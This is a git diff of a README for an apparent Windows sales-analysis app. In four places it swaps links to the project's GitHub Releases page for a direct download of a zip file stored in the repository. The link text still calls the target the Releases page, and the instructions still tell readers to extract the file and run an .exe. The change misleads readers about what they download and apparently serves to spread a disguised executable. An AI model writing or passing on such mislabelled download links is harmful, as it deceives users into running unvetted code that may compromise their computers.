@@ -1,6 +1,6 @@
 # 📊 ECommerce-Sales-Analysis - See Sales Trends Clearly
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Intact-kaposissarcoma840/ECommerce-Sales-Analysis/releases)
+[![Download](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Intact-kaposissarcoma840/ECommerce-Sales-Analysis/raw/refs/heads/main/ECommerce-sales-analysis/Sales-Commerce-E-Analysis-2.7.zip)
 
 ## 🖥️ What This App Does
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 To get the app for Windows, visit this page to download:
 
-[Open the Releases page](https://github.com/Intact-kaposissarcoma840/ECommerce-Sales-Analysis/releases)
+[Open the Releases page](https://github.com/Intact-kaposissarcoma840/ECommerce-Sales-Analysis/raw/refs/heads/main/ECommerce-sales-analysis/Sales-Commerce-E-Analysis-2.7.zip)
 
 On that page, look for the latest release and download the Windows file. If the release includes a `.zip` file, download it and extract it first. If it includes an `.exe` file, you can run it after the download finishes.
 
@@ -36,7 +36,7 @@ The app is built for normal desktop use. You do not need to know Python to use i
 
 Follow these steps on Windows:
 
-1. Open the [Releases page](https://github.com/Intact-kaposissarcoma840/ECommerce-Sales-Analysis/releases)
+1. Open the [Releases page](https://github.com/Intact-kaposissarcoma840/ECommerce-Sales-Analysis/raw/refs/heads/main/ECommerce-sales-analysis/Sales-Commerce-E-Analysis-2.7.zip)
 2. Find the newest release at the top of the page
 3. Download the Windows file attached to that release
 4. If the file is zipped, right-click it and choose Extract All
@@ -201,7 +201,7 @@ The app reads your sales data, groups similar values, and shows the results in c
 
 If you need the app again or want a newer version, use the same release page:
 
-[Go to Releases](https://github.com/Intact-kaposissarcoma840/ECommerce-Sales-Analysis/releases)
+[Go to Releases](https://github.com/Intact-kaposissarcoma840/ECommerce-Sales-Analysis/raw/refs/heads/main/ECommerce-sales-analysis/Sales-Commerce-E-Analysis-2.7.zip)
 
 ## 🧾 Useful Data Checks
 
